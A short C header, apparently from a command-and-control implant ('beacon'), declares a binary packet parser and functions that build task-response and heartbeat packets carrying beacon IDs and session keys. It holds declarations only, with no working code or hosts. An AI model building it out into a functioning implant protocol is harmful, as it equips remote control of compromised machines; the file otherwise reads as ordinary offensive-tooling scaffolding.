#pragma once

#include "beacon_common.h"

/* 用于读取结构化数据的二进制数据包解析器 */
typedef struct Parser {
    const BYTE8* data;
    SIZE_T len;
    SIZE_T off;
    CHAR error[128];
} Parser;

VOID ParserInit(Parser* p, const BYTE8* data, SIZE_T len);
SIZE_T ParserLeft(const Parser* p);
UINT32 ParserU32(Parser* p);
UINT64 ParserU64(Parser* p);
ByteBuf ParserBytes(Parser* p);
CHAR* ParserString(Parser* p);

INT PacketArrayBytes(ByteBuf* out, const VOID* data, SIZE_T len);
INT PacketArrayString(ByteBuf* out, const CHAR* value);
INT PacketArrayI16(ByteBuf* out, int16_t value);
INT PacketArrayI32(ByteBuf* out, int32_t value);
INT PacketArrayBool(ByteBuf* out, INT value);
ByteBuf PacketPackBytesData(const VOID* data, SIZE_T len);
ByteBuf PacketPackBytes(const ByteBuf* in);
ByteBuf PacketMakeFinal(UINT32 task_id, UINT32 command_id, const ByteBuf* payload);
ByteBuf PacketPackHeartbeat(UINT32 beacon_id, const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* metadata);
